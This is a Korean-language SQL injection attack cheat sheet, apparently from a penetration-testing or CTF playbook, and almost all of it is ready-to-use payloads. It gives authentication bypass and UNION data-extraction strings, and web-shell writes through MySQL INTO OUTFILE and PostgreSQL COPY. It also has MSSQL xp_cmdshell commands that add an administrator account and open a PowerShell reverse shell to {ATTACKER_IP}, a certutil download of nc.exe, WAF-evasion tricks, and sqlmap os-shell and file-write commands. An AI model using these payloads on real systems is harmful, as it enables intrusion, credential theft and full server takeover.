# 💉 SQL INJECTION

> **목표: SQL Injection 취약점을 통해 데이터베이스 접근, 웹쉘 업로드, 또는 시스템 명령 실행**

## ⚡ 기본 페이로드들

### 🔍 기본 취약점 탐지

```sql
-- GET 파라미터 기본 테스트
'
"
`
')
")
`)
1'
1"
1`

-- 에러 기반 탐지
' AND 1=1--
' AND 1=2--
" AND 1=1--
" AND 1=2--

-- 불린 기반 탐지
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
1" AND "1"="1
1" AND "1"="2

-- 시간 기반 탐지 (MySQL)
1' AND SLEEP(5)--
1" AND SLEEP(5)--
1; WAITFOR DELAY '00:00:05'--

-- 시간 기반 탐지 (PostgreSQL)
1'; SELECT pg_sleep(5)--
1"; SELECT pg_sleep(5)--
```

### 🔢 UNION 기반 기본 페이로드

```sql
-- 컬럼 수 확인
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--

-- UNION SELECT (컬럼 수 확인 후)
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--

-- 기본 정보 수집
' UNION SELECT 1,@@version,3,4--
' UNION SELECT 1,user(),3,4--
' UNION SELECT 1,database(),3,4--
' UNION SELECT 1,@@datadir,3,4--
```

### 🚪 인증 우회 페이로드

```sql
-- 로그인 폼 우회
admin'--
admin'#
admin'/*
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
') OR ('1'='1'--
') OR ('1'='1'#
' OR 1=1--
' OR 1=1#
" OR "1"="1"--
" OR "1"="1"#
" OR 1=1--
" OR 1=1#

-- NoSQL Injection (MongoDB)
admin' || '1'=='1
' || '1'=='1
{"$gt":""}
{"$ne":""}
{"$regex":".*"}
```

---

## 🎯 상황별 페이로드

### 🐬 MySQL 특화 페이로드

```sql
-- 기본 정보 수집
' UNION SELECT 1,@@version,@@datadir,user()--
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata--
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--

-- 데이터 추출
' UNION SELECT 1,username,password,4 FROM users--
' UNION SELECT 1,concat(username,':',password),3,4 FROM users--

-- 파일 읽기
' UNION SELECT 1,load_file('/etc/passwd'),3,4--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3,4--
' UNION SELECT 1,load_file('C:\\windows\\system32\\drivers\\etc\\hosts'),3,4--

-- 웹쉘 업로드 (가장 중요!)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php echo shell_exec($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/cmd.php'--

-- 더 정교한 웹쉘
' UNION SELECT 1,'<?php if(isset($_GET["cmd"])){ echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>',3,4 INTO OUTFILE '/var/www/html/terminal.php'--

-- 다양한 웹 루트 경로 시도
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/shell.php'--
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/usr/share/nginx/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/localhost/htdocs/shell.php'--
```

### 🏢 MSSQL 특화 페이로드

```sql
-- 기본 정보 수집
' UNION SELECT 1,@@version,3,4--
' UNION SELECT 1,db_name(),user_name(),4--
' UNION SELECT 1,name,3,4 FROM sys.databases--
' UNION SELECT 1,name,3,4 FROM sys.tables--
' UNION SELECT 1,name,3,4 FROM sys.columns WHERE object_id = OBJECT_ID('users')--

-- xp_cmdshell 활성화 및 실행 (최고 우선순위!)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

-- 시스템 명령 실행
'; EXEC xp_cmdshell 'dir C:\'--
'; EXEC xp_cmdshell 'net user'--
'; EXEC xp_cmdshell 'ipconfig'--

-- 사용자 추가 (관리자 권한시)
'; EXEC xp_cmdshell 'net user hacker Password123! /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

-- 리버스쉘 (PowerShell)
'; EXEC xp_cmdshell 'powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient(\"{ATTACKER_IP}\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'--

-- 파일 업로드 (certutil)
'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://{ATTACKER_IP}/nc.exe C:\temp\nc.exe'--
'; EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe {ATTACKER_IP} 4444'--
```

### 🐘 PostgreSQL 특화 페이로드

```sql
-- 기본 정보 수집
' UNION SELECT 1,version(),3,4--
' UNION SELECT 1,current_database(),current_user,4--
' UNION SELECT 1,schemaname,3,4 FROM pg_tables--
' UNION SELECT 1,tablename,3,4 FROM pg_tables WHERE schemaname='public'--
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--

-- 파일 읽기
' UNION SELECT 1,pg_read_file('/etc/passwd'),3,4--
' UNION SELECT 1,pg_read_file('/var/www/html/config.php'),3,4--

-- 파일 쓰기 (관리자 권한 필요)
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

-- 코드 실행 (plpythonu)
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('id')--
```

### 🔴 Oracle 특화 페이로드

```sql
-- 기본 정보 수집
' UNION SELECT 1,banner,3,4 FROM v$version--
' UNION SELECT 1,user,3,4 FROM dual--
' UNION SELECT 1,table_name,3,4 FROM user_tables--

-- 파일 읽기 (UTL_FILE)
' UNION SELECT 1,UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),1),3,4 FROM dual--

-- HTTP 요청 (UTL_HTTP)
' UNION SELECT 1,UTL_HTTP.REQUEST('http://{ATTACKER_IP}:8080/'),3,4 FROM dual--
```

### 📊 NoSQL Injection (MongoDB)

```javascript
// URL 파라미터에서
?username[$ne]=admin&password[$ne]=password
?username[$regex]=.*&password[$regex]=.*
?username[$gt]=&password[$gt]=

// JSON 형태
{"username": {"$ne": "admin"}, "password": {"$ne": "password"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$where": "function(){return true}"}}

// JavaScript Injection
{"username": "admin", "password": {"$where": "function(){return true}"}}
{"$where": "this.username == 'admin' && this.password == 'password' || '1'=='1'"}
```

---

## 🔄 우회 기법들

### 🛡️ WAF/Filter 우회

```sql
-- 공백 우회
/**/
%20
%09
%0a
%0b
%0c
%0d
%a0
+
/*comment*/

-- 키워드 우회
SELECT → SeLeCt, /**/SELECT/**/, SE/**/LECT, S%45LECT
UNION → UnIoN, /**/UNION/**/, UN/**/ION, UNI%4fN
WHERE → /**/WHERE/**/, WH/**/ERE, W%48ERE
AND → /**/AND/**/, A%4eD, &&
OR → /**/OR/**/, O%52, ||

-- 주석 활용
'/**/UNION/**/SELECT/**/1,2,3--
'/*!UNION*//*!SELECT*/1,2,3--
'/*! UNION SELECT */ 1,2,3--

-- 대소문자 섞기
' UnIoN SeLeCt 1,2,3--
' uNiOn sElEcT 1,2,3--
' UNION select 1,2,3--

-- 함수명 우회
substring → substr, mid, left, right
ascii → ord
char → chr
length → len, char_length
concat → concat_ws, group_concat
```

### 🎭 특수 문자 우회

```sql
-- 따옴표 우회
' → char(39), 0x27, \x27
" → char(34), 0x22, \x22

-- 따옴표 없이 문자열 사용
admin → char(97,100,109,105,110)
admin → 0x61646d696e
admin → concat(char(97),char(100),char(109),char(105),char(110))

-- 16진수 인코딩
'admin' → 0x61646d696e
'password' → 0x70617373776f7264

-- 문자열 연결
ad'+'min → admin (MSSQL)
'ad'||'min' → admin (Oracle, PostgreSQL)
concat('ad','min') → admin (MySQL)
```

### 📝 키워드 분할 및 우회

```sql
-- SELECT 우회
SEL/**/ECT
S/**/E/**/L/**/E/**/C/**/T
\x53\x45\x4c\x45\x43\x54
%53%45%4c%45%43%54

-- UNION 우회
UNI/**/ON
U/**/N/**/I/**/O/**/N
\x55\x4e\x49\x4f\x4e
%55%4e%49%4f%4e

-- 동적 SQL 구성
';DECLARE @sql VARCHAR(8000);SET @sql='SEL'+'ECT * FROM users';EXEC(@sql)--

-- 함수를 통한 우회
';EXEC('SEL'+'ECT * FROM users')--
```

### 🔀 연산자 및 조건 우회

```sql
-- = 우회
LIKE
IN
BETWEEN
REGEXP (MySQL)
SIMILAR TO (PostgreSQL)

-- 예시
WHERE username='admin' → WHERE username LIKE 'admin'
WHERE id=1 → WHERE id IN (1)
WHERE id=1 → WHERE id BETWEEN 1 AND 1

-- 논리 연산자 우회
AND → &&
OR → ||
NOT → !

-- 비교 연산자 우회
username='admin' → username LIKE 'admin'
id>0 → id>=1
id<10 → id<=9
```

---

## 🤖 자동화 도구 명령어

### 🔧 SQLMap 기본 사용법

```bash
# 기본 스캔
sqlmap -u "http://{IP}/page.php?id=1"
sqlmap -u "http://{IP}/page.php?id=1" --dbs
sqlmap -u "http://{IP}/page.php?id=1" --current-db
sqlmap -u "http://{IP}/page.php?id=1" --tables
sqlmap -u "http://{IP}/page.php?id=1" -D database_name --tables
sqlmap -u "http://{IP}/page.php?id=1" -D database_name -T table_name --columns
sqlmap -u "http://{IP}/page.php?id=1" -D database_name -T table_name --dump

# POST 데이터 스캔
sqlmap -u "http://{IP}/login.php" --data="username=admin&password=admin"
sqlmap -u "http://{IP}/login.php" --data="username=admin&password=admin" --dbs

# Request 파일 사용
sqlmap -r request.txt
sqlmap -r request.txt --dbs --batch

# 쿠키 포함
sqlmap -u "http://{IP}/page.php?id=1" --cookie="PHPSESSID=abc123; session=xyz789"

# User-Agent 설정
sqlmap -u "http://{IP}/page.php?id=1" --user-agent="Mozilla/5.0..."

# 프록시 사용
sqlmap -u "http://{IP}/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### 🚀 SQLMap 고급 기능

```bash
# OS 쉘 획득 (가장 중요!)
sqlmap -u "http://{IP}/page.php?id=1" --os-shell

# SQL 쉘 획득
sqlmap -u "http://{IP}/page.php?id=1" --sql-shell

# 파일 읽기
sqlmap -u "http://{IP}/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://{IP}/page.php?id=1" --file-read="/var/www/html/config.php"

# 파일 쓰기 (웹쉘 업로드)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://{IP}/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 특정 DBMS 지정
sqlmap -u "http://{IP}/page.php?id=1" --dbms=mysql
sqlmap -u "http://{IP}/page.php?id=1" --dbms=mssql
sqlmap -u "http://{IP}/page.php?id=1" --dbms=postgresql

# 리스크 및 레벨 조정
sqlmap -u "http://{IP}/page.php?id=1" --level=5 --risk=3

# WAF 우회
sqlmap -u "http://{IP}/page.php?id=1" --tamper=space2comment
sqlmap -u "http://{IP}/page.php?id=1" --tamper=charencode
sqlmap -u "http://{IP}/page.php?id=1" --tamper=randomcase
```

### 🎯 SQLMap 전문 옵션

```bash
# 시간 기반 공격 최적화
sqlmap -u "http://{IP}/page.php?id=1" --technique=T --time-sec=2

# Union 기반 공격만
sqlmap -u "http://{IP}/page.php?id=1" --technique=U

# Boolean 기반 공격만
sqlmap -u "http://{IP}/page.php?id=1" --technique=B

# 에러 기반 공격만
sqlmap -u "http://{IP}/page.php?id=1" --technique=E

# 모든 기법 사용
sqlmap -u "http://{IP}/page.php?id=1" --technique=BEUST

# 배치 모드 (자동 Yes)
sqlmap -u "http://{IP}/page.php?id=1" --batch

# 상세 출력
sqlmap -u "http://{IP}/page.php?id=1" -v 3

# 결과 저장
sqlmap -u "http://{IP}/page.php?id=1" --output-dir="/tmp/sqlmap_results"
```

### 🔧 기타 자동화 도구

```bash
# jSQL Injection
java -jar jsql-injection-v0.82.jar

# NoSQLMap (NoSQL Injection)
python nosqlmap.py -t http://{IP}/login -p username,password

# Commix (Command Injection + SQL)
commix -u "http://{IP}/page.php?id=1"

# SQLNinja (MSSQL 전용)
sqlninja -m fingerprint -f sqlninja.conf
```

---

## 🚨 문제 해결

### 🛡️ WAF 탐지될 때

```sql
-- 요청 분할
첫 번째 요청: '/*
두 번째 요청: */UNION/*
세 번째 요청: */SELECT/*
네 번째 요청: */1,2,3--

-- 시간 지연
sleep 2 && curl "http://{IP}/page.php?id=1'"

-- 프록시 체인 사용
proxychains sqlmap -u "http://{IP}/page.php?id=1"

-- User-Agent 로테이션
curl -A "Googlebot/2.1" "http://{IP}/page.php?id=1'"
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" "http://{IP}/page.php?id=1'"
```

### 🔒 필터링이 강할 때

```sql
-- 키워드 완전 우회
SELECT → \x53\x45\x4c\x45\x43\x54
UNION → \x55\x4e\x49\x4f\x4e
WHERE → \x57\x48\x45\x52\x45

-- 다중 인코딩
' → %27 → %2527 → %252527

-- 다른 공격 벡터 시도
Header Injection: X-Forwarded-For: 1' OR '1'='1
Cookie Injection: Cookie: id=1' OR '1'='1
JSON Injection: {"id": "1' OR '1'='1"}
```

### 📊 응답이 없을 때

```sql
-- 시간 기반 블라인드 SQLi
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--

-- Boolean 기반 블라인드 SQLi
' AND SUBSTRING(USER(),1,1)='r'--
' AND SUBSTRING(DATABASE(),1,1)='t'--
' AND LENGTH(DATABASE())>5--

-- DNS 기반 Out-of-band
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.{ATTACKER_DOMAIN}\\share'))--
```

### 🔍 데이터 추출이 어려울 때

```sql
-- 컬럼명 추측
common_columns='id,username,password,email,name,admin,role,status,created,updated'

-- 테이블명 추측
common_tables='users,admin,accounts,members,customers,login,auth,user_accounts'

-- 자동 브루트포스
for table in users admin accounts; do
    sqlmap -u "http://{IP}/page.php?id=1" -D database -T $table --dump
done

-- 에러 기반 정보 추출
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
```

### 📱 특수 환경 대응

```sql
-- JSON API
{"id": "1' UNION SELECT 1,2,3--"}
{"search": "test' OR '1'='1"}

-- XML
<id>1' UNION SELECT 1,2,3--</id>

-- SOAP
<param>1' UNION SELECT 1,2,3--</param>

-- GraphQL
{user(id: "1' OR '1'='1") {username password}}

-- REST API
GET /api/user/1' OR '1'='1
POST /api/login {"username": "admin'--", "password": "any"}
```

---

## 📋 SQL Injection 성공 우선순위

### 🔥 즉시 시스템 접근 (최고 우선순위)

1. **MSSQL xp_cmdshell** → 즉시 시스템 명령 실행
2. **MySQL INTO OUTFILE** → 웹쉘 업로드
3. **PostgreSQL COPY** → 파일 쓰기 권한

### 🟡 정보 수집 → 시스템 접근

1. **파일 읽기** → SSH 키, 설정 파일 확인
2. **데이터베이스 덤프** → 크레덴셜 정보 수집
3. **시스템 정보 수집** → 권한 및 환경 파악

### 🟢 인증 우회 → 관리자 기능

1. **로그인 우회** → 관리자 패널 접근
2. **권한 상승** → 높은 권한 계정 접근
3. **세션 하이재킹** → 기존 인증 세션 탈취

---

## ⏱️ 시간 관리 가이드

### 🎯 SQL Injection 테스트 단계별 시간

- **기본 탐지** (5분): Error, Boolean, Time-based 기본 테스트
- **수동 익스플로잇** (10분): UNION, 데이터 추출, 파일 접근
- **자동화 도구** (10분): SQLMap 실행 및 고급 기능
- **웹쉘 업로드** (5분): INTO OUTFILE, xp_cmdshell 시도

### 💥 성공 기준

**즉시 다음 단계로:**

- [ ] 웹쉘 업로드 성공 → `SHELLS/reverse-shells.md`
- [ ] 시스템 명령 실행 성공 → 리버스쉘 획득
- [ ] 데이터베이스 관리자 권한 → 파일 시스템 탐색
- [ ] 중요 크레덴셜 수집 → 다른 서비스 공격

**다음 단계**:

- 성공시 쉘 획득 또는 권한 상승
- 실패시 다른 웹 취약점 테스트
- 정보 수집 성공시 해당 정보로 다른 서비스 공격
